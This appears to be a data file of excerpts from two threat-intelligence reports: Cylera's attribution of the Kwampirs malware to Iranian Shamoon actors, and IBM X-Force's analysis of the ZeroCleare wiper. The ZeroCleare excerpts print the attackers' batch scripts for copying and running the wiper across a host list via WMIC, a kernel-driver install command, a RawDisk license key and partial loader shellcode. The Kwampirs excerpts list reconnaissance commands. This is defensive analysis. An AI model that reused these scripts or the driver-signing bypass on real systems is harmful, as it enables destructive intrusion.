On the other hand, because of the public dates known for Kwampirs and Shamoon 2 campaigns, it seems that the template system was implemented first in Kwampirs, as Kwampirs’ template system code was used before Shamoon 2 and 3 (or at least that’s what OSINT tells us). They both use a similar building process rendering configurations and binding components in the resources on the droppers. In Shamoon 1, the code didn’t contain the helper functions related to parsing the template values, indicating that the C2 and proxy configurations were very probably set manually at the source code in each compilation. If there was any builder, its functionality might be reduced to just binding the payloads into the dropper resources."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|7881219b7ad545cfa17cb7eb308ab9e9
"In conclusion, the Shamoon 2 dropper uses a template system with a similar placeholder format and an extremely similar auxiliary code. The builder exposure very probably links Kwampirs source code with the original Shamoon 2 (and 3) source codes. The placeholders are filled with information related to hidden payload extraction contained at their resources, such as resource identifiers, decryption keys and sizes. In addition, considering that the dropper and reporters are based on templates, the general process of the builder tool responsible for creating new Shamoon 2 and Kwampirs campaigns can be illustrated in the following diagrams Figure 95 (Shamoon 2 and 3) and Figure 96 (Kwampirs).

6.1.1 Kwampirs is based on Shamoon 1 Confidence: High -- The Kwampirs developers had knowledge of the Shamoon 1 source code while creating Kwampirs. Findings that support this conclusion include: There is strong code and behavioral similarity between Kwampirs and Shamoon 1. Components such as the propagation module, dropper, and C2 communication inherit the majority of their code from a fork of Shamoon. Cylera researchers have found a sample (886e7) that seems to be an intermediate step in the evolution from Shamoon to Kwampirs, containing a mix of characteristics found in each family. While there are “open source” versions of Shamoon publicly available, each has numerous differences with Kwampirs, making the relation between the two codebases unlikely. Despite significant code overlap, it is important to note that Shamoon and Kwampirs do have differences in implementation or approach in a variety of areas, even as simple as the usage of EXE vs DLL files. It is not the case, therefore, that Kwampirs is simply a “slimmer” Shamoon with certain components removed, but a unique family created and maintained separately, whether due to differences in purpose or as properties that emerged due to the organizational structure of the threat actors.

This was not apparent in Shamoon 1 and is first found (in publicly-available samples) in Kwampirs. Shared Reporter Updates Indicating Co-evolution The “reporter” components of Kwampirs and Shamoon 2 contain signs of co-evolution over time, with Shamoon 2 mirroring updates first observed in Kwampirs. Both implement: the same custom communications protocol retrieval of the same initial host information a shared custom binary message format an encryption routine for build configuration parameters the same C2 URL format, all of which were first seen in Kwampirs campaigns based on publicly-known samples Given (1) Shamoon 1’s lack of auxiliary template system code, leaked placeholders, or the described reporter functionality and (2) Kwampir’s inclusion of these updates before Shamoon 2 (based on publicly-known samples) Cylera researchers conclude that the developers of Shamoon 2 had knowledge of the source code of Kwampirs during development.

6.1.3 Direct relationship between the Kwampirs and Shamoon actors Based on our analysis, including the following points: Shamoon 1 precluding Kwampirs: relationship described above implies that the Kwampirs group copied from the Shamoon 1 group Kwampirs precluding Shamoon 2: relationship described above implies that the Shamoon 2 groups copied from the Kwampirs group It is commonly accepted that the group behind Shamoon 1, 2, and 3 either belong to the same single group or a set of smaller groups within a larger organization This would imply both that the Kwampirs group copied from the larger Shamoon group and the larger Shamoon group copied from the Kwampirs group at different times over the course of multiple years We conclude with medium-high confidence that there is a direct relationship between the actors behind Kwampirs and the actors behind Shamoon 1, 2, and 3. The extended, bidirectional sharing of information between the two actors, revealed by the sequence of updates to each malware family, makes the possibility of a collaborative relationship more likely than alternatives such as false-flag operations or opportunistic theft and repurposing of source code.

The apparent serialized sequence of updates, observed in the publicly-known samples, seen across Kwampirs and Shamoon would not be characteristic of two separate entities working in parallel Dev timelines never overlap, seeming like it’s one group shifting efforts. 201x-2013 Shamoon, ~2014-2016 Kwampirs, 2016- Shamoon 2, 3 Considering the common attribution of Shamoon to Iranian APTs specifically, the following points also support this conclusion: Iranian APTs would very likely primarily collaborate with other nation-states; this limits the number of potential collaborators and therefore the likelihood that they are an external collaborator Known to collaborate with Hezbollah, but differences in resources and skill between the two nations at the time of development make this type of bidirectional collaboration unlikely Iranian “cyber army” structure is fragmented in a way that would naturally lead to the types of patterns observed without any third-party involvement The victimology of the Kwampirs campaigns had significant similarities to that of campaigns by Iranian APTs (i.e. stonedrill and newsbeef), including heavy targeting of Saudi Arabia and regular targeting of hospitals Of the remaining two possibilities (B and C), prior reports of the involvement of multiple Iranian APTs in the Shamoon 2 attacks would leave the second option as the only possibility.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|93bb3cc9f9ea423581a585531690c9dc
"However, recent reports by Clearsky have claimed that the multiple Iranian APT groups commonly attributed to Shamoon 2 by the security community (specifically APT33 and APT34/Oil-Rig) have in fact always been one single group. In either case, the final conclusion is that Kwampirs seems to be related to Iranian APTs. Each of these two possibilities (B and C) would attribute the activity to threat actors linked to the Iranian state. So, assuming one of these two commonly accepted possibilities is truly valid, the final conclusion is effectively equivalent considering the scope of our report, as the remaining ambiguity is mostly a matter of understanding the inner workings of the Iranian cyber operations. Assuming Shamoon versions 1, 2 and 3 are correctly attributed to Iranian APTs, then this claim would also imply that the group behind Kwampirs is indeed an Iranian APT.

Kwampirs actors would likely not want to base their recon malware on Shamoon, risking having it attributed to them

6.2 Other indicators and speculations At this point, our researchers want to point out some interesting facts that are just too weak by themselves to use for any kind of attribution, but that are still worth mentioning."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|bfd97e92efe9484d8e5e9f06e0e8f15c
"6.2.1 OilRig/APT34/Helix Kitten Cylera researchers found similar looking placeholders as Kwampirs, in OilRig’s custom toolset, as well as malware handles using a three-hash constant string somehow (“###“). Keep in mind that the first Kwampirs samples were reported in January 2015. In May 2016 OilRig was discovered doing a reconnaissance campaign targeting Saudi Arabia with the Helminth executable variant, using a custom Keylogger module which is dropped to a PE32 executable file named wintrust.hlm (Figure 96), and it contains the following strings (at function 0x10001E30).

Figure 96: Strings contained in Keylogger module of Helminth

“####T####” would correspond to the placeholder for the symbol or string indicating the beginning of the “Title”;

In this example, the clipboard was stored in the same file, but with a different looking format (Snippet 17). <<< Clipboard ---> [clipboard contents]>>> Snippet 17: Example of a captured clipboard content written by the helminth keylogger module"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|5c61067a43d44fe29eebe9db7248fcba
It could just be coincidental that a similar format was used, but it could also be that they forgot to add these placeholders to the list of placeholders to render, especially if the source code developers were not the same as the ones converting them into templates, or if the keylogger was developed by a different person and the integrator did not realize the need to render them. “####ET####” means “End of Title”, and maybe it should have been rendered to strings similar to the “<<<” and “>>>”, so it would look pretty similar to the clipboard format. Our researchers have found multiple use of the substring “###”, and combinations of it, in OilRigs custom toolset and/or campaigns. From powershell to binary executables, used as empty or default values, or for signaling payload offsets, even in the Oilrig campaign in which they were dubbed OilRig: In the file adbmanager.exe, part of the Helminth executable variant (adbmanager.exe), in the same campaign where the placeholders “####T####” and “####ET####” can be found, another match of the substring “###” is found, this time it is a value of “#*###”, that in the powershell version was just “###”. Also note that when checking for the DNS resolution of the IP “35.35.35.35” (Figure 97), the ASCII code 35 is in fact a ‘#’ symbol.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|44f05287801e49c39d7ef25e0cba0d52
"“####ET####” would correspond to the symbol or string for the “End of Title” (similar as Kwampirs “###APB###” was related to “Proxy Bypass” information). It is true that it is a sequence of four ‘#’ instead of three wrapping the acronyms, but the style is so similar that researchers wanted to point it out. Someone might think that these strings are just literals and not placeholders, but no other literals were found with this kind of format in these binaries (Snippet 16). ####T####[Window title here]####ET####

The Helminth powershell version used the substring “###” as explained by Mandiant and LogRhythm , as a default value for the “botid”. Also in some campaigns they try to hide the “three hashes in a row” by splitting and concatenating it like in Figure 98.

Figure 98: Helmint powershell version “###” string obfuscation"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|2899601390ef485ebcacbe1e5547c9a8
"Figure 98: Helmint powershell version “###” string obfuscation

This might have been done for AV/Sandbox evasion after the first campaigns to avoid detection. “###$$$” as a delimiter, signaling the offset of the payload to drop. These samples were identified as “ThreeDollars” by Unit 42, but the other part (the prefix “###”) was there too. It could have been called ThreeHashes too.. Not as just three in a row, but helminth also uses a string with value “#command#” as a separator between a GUID and the command being sent in their custom DNS C2 tunneling protocol. For example, with a sequence of “#command###filename” it will issue a victim to upload that filename. This could also be an unfinished placeholder, as OilRig does not really need to say “this is a command” when they know their own protocol, and it sends unneeded traffic over DNS, something that exposes them even more. But maybe not.

Also, the APT34/Oilrig threat actor has been performing similar CNE operations as Kwampirs, with target overlaps where the malware payload consists of a set of shell commands that will extract typical Host and Domain/Network information, as well as processes, services and so on. For example with Helminth it executes the commands at Snippet 18."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|d9f72f4dce374f258bfca94d7cc026fc

Cylera Labs admits that OilRig using placeholders like “####T####”, “####ET####”, or “###$$$” does not provide enough indicators to imply that they are the group behind Kwampirs and Shamoon, but it is unavoidable to consider that these indicators could really be related. That’s why we decided to share them here, so other researchers can take advantage of them when trying to cross correlate toolsets, artifacts, or handles for attribution. On the other hand, taking into consideration that APT33 and APT34/OilRig have been discovered cooperating in other campaigns, likely sharing attack infrastructures, as well as the fact that some of the alleged members of both groups have been identified in leaks linked to Kavosh Security Group, our researchers believe Kwampirs could be a result of this cooperation between both groups.

And Kwampirs’ later versions make a switch to more specific WMI commands (Snippet 21), with a deeper interest in the hardware components (not only the drives), something that actually makes sense if their interests target medical devices and the workstations controlling them as well as Windows-based IoMT. hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAddress, EndingAddress wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconnector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop wmic process get caption,commandline time /t date /t

6.2.2 “Ansar Group” The Ansar Group, a hacking team known to work directly for the Iranian government, had a batch of internal documents leaked by Lab Dookhtegan in 2020. Included in these documents are diagrams outlining possible future targets (Figure 99). Reviewing the translation of the original images, it’s clear that hospitals and healthcare-related organizations, even the Ministry of Health, were well within the scopes of this group, allegedly under the direction of the Iranian government:

They also target a lot of military medical centers and cities, target types that match Trend Micro blog post (Figure 100).

OilRig may or may not be the exact same actors behind Kwampirs. Definitely some of the style, with “living on the land” information gathering, and many TTPs are matching with this group, apart from what McAfee has already said about Shamoon 2 sharing the same infrastructure as OilRig (cited here as “Oil-RIG” ).

Looking closer at it, Cylera researchers realized it was a binary designed for a CTF game (ANSSI SSTIC 2016, SHA256: 0d39c9c1d09741a06ef8e35c0b63e538f60f8d5a7f995c7764e98a3ec595e46f challenge.pcap this traffic capture contains a CTF game with a level called “video”, Figure 102).

Turns out the flag for passing the level was also an XOR key present in Kwampirs, indicating that it was not “an accidental leak,” but something done on purpose. They used one of the Kwampirs XOR keys to encrypt the data to leak in the game (28 30 A4 3F 6D 28 04 23 36 2A 32 DC AD 0B A0 4B E8 20 1F 64 84 0A F4 C4 C7 […]), and another Kwampirs XOR key as the final token for passing the level (53 11 37 16 72 BA 01 79 FA 3E 91 8A 83 BE DE B4). The description of the level states that “a cousin of DUQU” (Snippet 22) has been discovered trying to steal the master key of a company called “ThaBus” (and at the metadata we can reed “Airlhes PKI oldschool screensaver”, and Airlhes means Airline)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|58be56699cf74e66a3fd732a30b10a6e
This challenge has a description,a video and a binary that looks like a screensaver. The text at the game (extracted from the initial pcap that contains all the CTF levels embedded in it) explains that the master key of a company called “Thabus” was leaked, and that you have to help them identify how it happened.

There are not many airlines associated with buses out there, but it reminds us of a big one… AirBus. DUQU is considered a reconnaissance tool based on Stuxnet. Specifically, it is known to be a slimmed-down version of Stuxnet with just reconnaissance purposes for later operations, which coincidentally settles a parallelism between the relation of Kwampirs and Shamoon too, at least at the technical level. Cylera labs did not find any evidence of Kwampirs being used before any Shamoon attack, with both having different goals/industry.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|1d7bb6a11dbd4e3092d08130133355e2
"Interestingly on similar timelines, APT33 targeted Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), the Saudi General Authority of Civil Aviation (GACA), and Vinnell Arabia. So this CTF level could be suggesting that this European Airline had to handle an incident with Kwampirs (successful or not), which was recognized at the time as a cousin of DUQU because of the similarities and parallelism with Shamoon. This would imply that in 2016 Kwampirs could have been used outside of the healthcare industry, against aviation/aerospace. With this incident, the victimology would look fully aligned with the targets of APT33 at that time, which makes our researchers believe that, because of the aggregation of all the indicators collected (the two malware families’ similarities, the builder/template traces, the reporters co-evolution, and this parallelism), Kwampirs attribution is pointing to APT33/APT34 and/or the associated groups collaborating closely with them. Kwampirs would be to Shamoon what Duqu was to Stuxnet, but as far as we know Kwampirs was never followed by destructive attacks. But.. Hey! This was just a Capture The Flag game! ;)

CONCLUSION

The linkage between Kwampirs and Shamoon

7 Conclusion Cylera researchers have discovered connections between Kwampirs, a malware variant deployed against global healthcare supply chains, and Shamoon, a highly-destructive form of “wiper” malware believed to have been used by state-backed Iranian APT groups. Initial similarities in code and victimology were demonstrated by Cylera researcher Pablo Rincon at the XIII STIC conference held in Madrid in December 2019. The similarities were further confirmed by a sequence of FBI PIN notifications and independent researchers in early 2020. Cylera researchers have since continued analysis of the malware and its infrastructure, uncovering further evidence of links between the two families that extend beyond simple code similarity. These findings include a sample that appears to be a stepping stone between Shamoon 1 and Kwampirs, evidence of co-evolution between the two families over time demonstrated by bidirectional updates. Also discovered was a previously-unknown template system and builder tool used by the operators for Shamoon 2 and Kwampirs. Researchers additionally confirmed that Kwampirs did not branch from public “open source” Shamoon projects and further confirmed Kwampirs’ focus on US and Saudi targets through expanded sinkhole telemetry collection."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|b41af58095a648918a565012cae5302a
Based on these findings, Cylera researchers conclude the following: the actors behind Kwampirs and Shamoon have collaborated continuously -- medium-high confidence the actors are indeed part of the same group, including the possibility that they are the same developers -- medium confidence Given the common attribution of all Shamoon campaigns to Iranian APT groups, Cylera researchers believe this report extends this attribution to Kwampirs campaigns and similarly concludes with medium confidence that the Kwampirs campaigns were conducted by statebacked Iranian APTs. These conclusions, if indeed correct, would recast Kwampirs as a large-scale, multi-year attack on global healthcare supply chains conducted by a foreign state actor. The data gathered and systems accessed in these campaigns have a wide range of potential usage, including theft of intellectual property, gathering of medical records of targets like dissidents or military leaders, or reconnaissance to aid in the planning of future destructive attacks. There is no evidence indicating the actor’s true intended or actualized use, however, so the ultimate intention of the Kwampirs campaigns remains uncomfortably ambiguous.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|8ff90484ec1d40089634ebe3271fd8f8
"Regardless of intent, this would represent a broadening of state-backed campaigns targeting critical infrastructure and supply chains of foreign adversaries to broadly include the healthcare sector, a boundary that had not previously been so brazenly crossed and a shift for which many healthcare organizations are unprepared.

1. New Malware “ZeroCleare” Used in Destructive Attacks IBM® X-Force® has been researching and tracking destructive malware in the Middle East, particularly in the industrial and energy sector. Since the first Shamoon attacks that started affecting organizations in the region in summer of 2012, we have been following the evolution of destructive, disk-wiping malware deployed to cause disruption. In recent analysis, X-Force Incident Response and Intelligence Services (IRIS) discovered new malware from the Wiper class, used in a destructive attack in the Middle East. We named this malware “ZeroCleare” per the program database (PDB) pathname of its binary file. According to our analysis, ZeroCleare was used to execute a destructive attack that affected organizations in the energy and industrial sectors in the Middle East. Based on the analysis of the malware and the attackers’ behavior, we suspect Iran-based nation state adversaries were involved to develop and deploy this new wiper. Given the evolution of destructive malware targeting organizations in the region, we were not surprised to find that ZeroCleare bears some similarity to the Shamoon malware. Taking a page out of the Shamoon playbook, ZeroCleare aims to overwrite the Master Boot Record (MBR) and disk partitions on Windows-based machines. As Shamoon did before it, the tool of choice in the attacks is EldoS RawDisk, a legitimate toolkit for interacting with files, disks, and partitions."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|54785d5184e04a548130df12d6b4799c
Nation-state groups and cyber criminals frequently use legitimate tools in ways that a vendor did not intend to accomplish malicious or destructive activity. Using RawDisk with malicious intent enabled ZeroCleare’s operators to wipe the MBR and damage disk partitions on a large number of networked devices. To gain access to the device’s core, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch scripts to bypass Windows controls. Adding these ‘living off the land’ tactics to the scheme, ZeroCleare was spread to numerous devices on the affected network, sowing the seeds of a destructive attack that could affect thousands of devices and cause disruption that could take months to fully recover from. These tactics resemble the way Shamoon was launched in attacks on Arabian Gulf targets in 2018. X-Force IRIS assesses that the ITG13 threat group, also known as APT34/OilRig, and at least one other group, likely based out of Iran, collaborated on the destructive portion of the attack. X-Force IRIS’s assessment is based on ITG13's traditional mission, which has not included executing destructive cyber-attacks in the past, the gap in time between the initial access facilitated by ITG13 and the last stage of the intrusion, as well as the different TTPs our team observed.|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|817f8f9eb9174cd59a83a6e9ffaccf16

To date, X-Force IRIS has not found any previous reporting on the ""ZeroCleare"" wiper, its indicators, or elements observed in this campaign. It is possible that it is a recently developed malware and that the campaign we analyzed is one of the first to use this version."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|aa2469c28e3f478e9075808c00bf25c0
1.1. Destructive Attacks – A Rising Concern X-Force IRIS has been following a marked increase in destructive attacks in the past year, having logged a whopping 200 percent increase in the amount of destructive attacks that our team has helped companies respond to over the past six months (comparing IBM incident response activities in the first half of 2019 versus the second half of 2018). Destructive attacks on the energy and industrial sectors have been a rising concern, especially in countries where the economy relies on oil and gas industries, like in some parts of the Middle East and Europe. While we have seen them more frequently in the Middle East, these attacks are not limited to any part of the world and can be launched by any offensive nationstate group seeking to adversely affect the economy of rival countries, or by cybercriminals that use destruction as a pressure tactic. Overall, destructive attacks we have been seeing affect organizations are being carried out by threat actors of varying motivations who could be employing destructive components in their attacks. Some pressure victims to pay them, others counterblow when they are not paid. When these attacks are carried out by nation state adversaries, they often have military objectives that can include accessing systems to deny access to, degrade, disrupt, deceive, or destroy the device/data.|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|0e44c0712dfa4cb4940697beb9881bc4
"1.2. ZeroCleare’s General Infection Flow The ZeroCleare wiper is part of the final stage of the overall attack. It is designed to deploy two different ways adapted to 32-bit and 64-bit systems. The general flow of events on 64-bit machines includes using a vulnerable, signed driver and then exploiting it on the target device to allow ZeroCleare to bypass the Windows hardware abstraction layer and avoid some operating system safeguards that prevent unsigned drivers from running on 64-bit machines. This workaround has likely been used because 64-bit Windows based devices are protected with Driver Signature Enforcement (DSE). This control is designed to only allow drivers which have been signed by Microsoft to run on the device. Since ZeroCleare relies on the EldoS RawDisk driver, which is not a signed driver and would therefore not run by default, the attackers use an intermediary file named soy.exe to perform the workaround. They load a vulnerable but signed VBoxDrv driver which the DSE accepts and runs and then exploits it to load the unsigned driver, thereby avoiding DSE rejection of the EldoS driver.

Once loaded, the vulnerable VBoxDrv driver is exploited to run shellcode on the kernel level. Post-exploitation, the driver was used to load the unsigned EldoS driver and proceed to the disk wiping phase. Having analyzed soy.exe, we determined it was a modified version of the Turla Driver Loader (TDL) of which purpose is to facilitate that very DSE bypass. The same process does not apply to the 32-bit systems as they do not limit running unsigned drivers in the same manner.

Figure 1: ZeroCleare’s Top Level Infection Flow (Source: IBM X-Force)

1.3. Two ZeroCleare Versions, Only One Worked The ZeroCleare attack is facilitated by a number of files that each fulfill a different role in the infection chain. Files we analyzed are either scripts or executables designed to spread and launch the ZeroCleare malware across the targeted infrastructure. ZeroCleare comes in two versions, one for each Windows architecture (32-bit and 64-bit), but while both exist, only the 64-bit worked as intended. The 32-bit version was supposed to function by installing the EldoS RawDisk driver as a driver service before beginning the wiping process but caused itself to crash when attempting to access the service during the wiping process. The analysis in this paper will focus on the 64-bit version of ZeroCleare."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|2db936e6f00142968bb05436cf8d5044

Table 1: ZeroCleare attacks: malware and supporting files

The following are some overarching notes regarding the file list: −

The PowerShell and batch scripts analyzed were designed to spread and execute the ZeroCleare malware across the domain.

−

The main PowerShell script, ClientUpdate.ps1 spreads itself to Domain Controllers (DC), and then from those severs it uses the Active Directory PowerShell module GetADComputer cmdlet to identify lists of target devices to copy and execute the malware on.

−

The Batch scripts support spreading the malware but work in a more simplistic manner using premade text files that contain hostnames to infect, rather than generating the lists themselves.

−

We found that the ZeroCleare Wiper’s executable itself, delivered in a file named ClientUpdate.exe, ran with a legitimate license key for EldoS RawDisk driver.

The following sections of this paper provide analysis of the ZeroCleare malware, as well as technical details on supporting files listed in Table 1.

This file was identified as the new wiper that was deployed in destructive attacks to damage Windows-based devices. It was named ZeroCleare by IRIS per the file path of its PDB file. As mentioned earlier in this paper, ZeroCleare relies on the legitimate EldoS RawDisk driver that was previously used in Shamoon attacks to access and wipe the hard drive directly. Using this driver, which is an inherently legitimate tool, allows ZeroCleare attackers to bypass the Windows hardware abstraction layer and avoid the OS safeguards. To install the EldoS RawDisk driver, ZeroCleare uses another binary, Soy.exe, to load the driver on the targeted device and activate it. X-Force IRIS analyzed Soy.exe and found that it is a modified version of the Turla Driver Loader (TDL), which is designed to bypass x64 Windows Driver Signature Enforcement. The TDL application works by first installing a legitimate but vulnerable, signed, VirtualBox driver, vboxdrv.sys (in this case it is named saddrv.sys). Once loaded, this vulnerable driver can be exploited to run shellcode at the kernel level, which in this case is used to load the unsigned EldoS driver. ClientUpdate.exe executes soy.exe via the following command line: cmd.exe /c soy.exe"|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|0b1a17c5b1564f76a9460e93ae85fb51

In order to activate the disk management driver, the malware needed to open a file handle via a unique filename using the logical drive (For example, C:\). The file name's format requested by function CreateFileW must start with # followed by the license key issued to the developer by EldoS. We have observed ZeroCleare attempt to open the following filename: \\?\ElRawDisk\? ?\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf 3c911e2287a4b906d47d

The RawDisk license key was: b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d

It could be a temporary license key or one that was stolen from someone else. Various information stealing malware can obtain license keys from infected systems. The ClientUpdate.exe (x64) wiping function creates a buffer consisting of the byte 0x55 and uses function DeviceIoControl to send the buffer to the RawDisk driver to write data to the disk and wipe the victim's hard drives. Similar to what the Shamoon malware does, this would overwrite the MBR, partitions, and files on the system with junk data. The sample was observed to contain the following PDB string: C:\Users\Developer\source\repos\ZeroCleare\x64\Release\zeroclear.pdb

Same as ClientUpdate.exe (x64), this file was also identified as the ZeroCleare wiper. As it is designed for 32-bit Windows systems, Driver Signature Enforcement does not prevent unsigned drivers from running. Therefore, this version of ZeroCleare does need to use Soy.exe or TDL, the latter being only applicable to 64-bit systems. ClientUpdate.exe (x86) first attempts to install itself as a service by running:

C:\windows\system32\cmd.exe /u /c sc create soydsk type= kernel start= demand binPath = [sample path]

Next, it attempts to activate the disk management device driver by opening a file handle via a unique filename using the logical drive (For example, C:\). The file name's format requested by function CreateFileW must start with # followed by the license key issued to the developer by EldoS. This 32-bit ZeroCleare version attempts to open the following filename: \\?\ElRawDisk\? ?\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf 3c911e2287a4b906d47d"|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|7901fd3a24d64682b9c071739d16b183
"The malware uses the same EldoS RawDisk driver license key as observed in the 64-bit version: b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d

This version did not work properly. During analysis the sample crashed as the disk management driver had not been installed and was therefore not accessible. We can theorize that this may be a bug in the code. It was later confirmed that the sample required to be named ‘zeroclear.exe’ in order to run correctly. However, this was not the name used for the malware during the observed incident and therefore the binary would not have run correctly in that instance. X-Force IRIS patched the 32-bit ZeroCleare sample in order to continue the analysis provided in this paper. Once it worked, we noted that this version’s wiping behavior was similar to that of ClientUpdate.exe (x64), which functioned by creating a buffer consisting of ‘0x55’ bytes and used the function DeviceIoControl to send the buffer to the RawDisk driver to write data that would wipe the victim's hard drive(s). Similar to what the Shamoon malware does, this would overwrite the MBR, partitions, and files on the system with junk data.

The file soy.exe had a special role in the overall kill chain of ZeroCleare attacks as it was necessary for the initial bypass of Windows OS controls. This file was identified as a customized version of the Turla Driver Loader (TDL), which is a driver loader application designed for bypassing Windows x64 Driver Signature Enforcement (DSE). DSE is a protective feature that was introduced in 64-bit versions of Windows 8 and 10, to prevent the loading of drivers unsigned by Microsoft. TDL works by first loading a legitimate, Microsoft-signed, VirtualBox VBoxDrv driver. However, a vulnerable version of the driver is intentionally used, and TDL can then exploit the vulnerability to run kernel-level shellcode and ultimately load other, unsigned drivers. The file sample's resource section includes two encoded resources with the following hashes: Resource ID 1: b1ba74d92395012253b33462c67a726ff266c126f2652092c2f57659d0f46e77 Resource ID 103: 37680a5a26abc22cde99c5222881a279a04b90680231736efac1e17a8e976755"|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|0977e31abfff409a8228e64bc4641015
"Before decoding the resources, soy.exe creates a mutex called Ptición de trabajo. It then attempts to access its resource section to read encoded resource 103 and uses XOR key 0x AAAAAAAAAAAAAAAA to decode it. Next, soy.exe writes the decoded content to a 64-bit file called elrawdsk.sys 1. This file was identified as the 64-bit version of the EldoS RawDisk driver, version 3.0.31. After that, soy.exe attempts to access resource 1 and uses XOR key 0xAAAAAAAAAAAAAAAA to decode it. The soy.exe sample then writes the decoded content to a 64-bit VirtualBox VBoxDrv.sys driver file called saddrv.sys 2, which is known to have privilege escalation and arbitrary code execution vulnerabilities. This file is a signed driver. Once the resources have been decoded, soy.exe tries to create and start a driver service with name VBoxDrv and saddrv.sys, in order to load the vulnerable VBoxDrv device driver. At this point, the soy.exe sample uses the Turla Driver Loader (TDL) method to exploit the vulnerability in the VirtualBox driver and load and execute the following shellcode: 90 48 8B C4 41 54 48 81 EC 90 00 00 00 48 89 58 10 49 89 D4 48 89 68 18 48 8D 1D E1 FF FF FF 4C 89 68 E8 48 81 C3 00 03 00 00 4C 89 70 E0 4C 8B EA 4C 89 78 D8 4C 8B C9 33 C9 41 B8 54 64 6C 53 4C 63 73 3C 4C 03 F3 45 8B 7E 50 41 8D 97 00 10 00 00 41 FF D1 45 33 C9 48 8D A8 00 10 00 00 48 81 E5 00 F0 FF FF 41 83 BE 84 00 00 00 05 0F 86 B0 00 00 00 41 8B 8E B0 00 00 00 85 C9 0F 84 A1

1.7. Batch Scripts Used by ZeroCleare Attackers A batch file is a script file that’s typical to DOS, OS/2 and Microsoft Windows. It consists of a series of commands to be executed by the command-line interpreter, stored in a plain text file. On devices running Windows operating systems, a batch file would store commands in serial order. ZeroCleare attackers used at least seven batch files in the attack’s flow to add functionality.

1.7.1. v.bat Batch script v.bat is designed to read a text file containing system hostnames. In this case, the file is called 'listfile.txt' although other names for this file have also been observed.

For each hostname within the list, the script first copies the contents of directory ""C:\Users\$USER \Desktop\UpdateTemp"" to ""\\$hostname\c$\Windows\Temp"" and then attempts to run ""cmd /c c:\Windows\Temp\cu.bat"" using Windows Management Interface Command (WMIC), which is a simple command prompt tool that returns information about the system that’s running it. for /F ""tokens=*"" %%A in (listfile.txt) do ( xcopy /S /Y ""C:\Users\$USER\Desktop\UpdateTemp"" \\%%A\c$\Windows\Temp && wmic /node:"" %%A"" process call create ""cmd /c c:\Windows\Temp\cu.bat"" )

Batch files 1.bat, 2.bat, 3.bat, 4.bat, and 5.bat appear redundant as they were all identified to have the same function as v.bat.

1.7.2. Cu.bat Once it is run by its predecessor (v.bat), the batch script cu.bat begins by switching to the directory C:\Windows\Temp. It checks for the existence of '%PROGRAMFILES(X86)%' to determine if it is running on a 64- or 32-bit system architecture. It will change to the 'x64' directory as needed, but otherwise the switch proceeds with the 'x86' directory. Once that’s established, cu.bat runs the file .\ClientUpdate.exe, which is the ZeroCleare malware. cd c:\Windows\Temp\ IF EXIST ""%PROGRAMFILES(X86)%"" (cd .\x64) ELSE (cd .\x86) .\ClientUpdate.exe"|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|802aa2a5cdeb45599f54be432960c389
"1.8. PowerShell Scripts Used by ZeroCleare Attackers PowerShell is a task-based command-line shell and scripting language built on .NET. As such, it is part of every Windows operating system. While PowerShell is originally designed to help system administrators and power-users rapidly automate tasks that manage OS and its processes, it is also widely used by attackers that rely on ‘living off the land’ tactics. ZeroCleare attackers used some PowerShell scripts in the attack kill chain. Further detail follows.

1.8.1. ClientUpdate.ps1 X-Force IRIS identified two PowerShell scripts with the name ClientUpdate.ps1. The first and shorter of the two appeared to be the parent of the second and larger script. The first, short script, 4 takes as its parameter a decryption key and defines a variable $ClientData which contains a large quantity of AES-encrypted and Base64-encoded data. The script decodes this data with the decryption key, saves it in the current directory as _ClientUpdate.ps1, and executes it using PowerShell.exe. It passes the decryption key as a parameter. It then sleeps for 5 seconds before deleting the newly created script file. We were able to identify the decryption key from system artifacts and discovered that the $ClientData variable contained the larger version of the ClientUpdate.ps1 script. The second ClientUpdate.ps1 script 5 is significantly longer and more complex. The overall purpose of this script is to spread the ZeroCleare malware as far as it can across the domain. This script sets out to do that by setting up a network of master and slave (agent) systems, with each agent responsible for copying and executing the malware onto a proportion of the target (client) systems. Domain controllers were specifically chosen as agents to facilitate the spreading, and the Active Directory PowerShell module 'Get-ADComputer' cmdlet was used to assemble lists of target and client 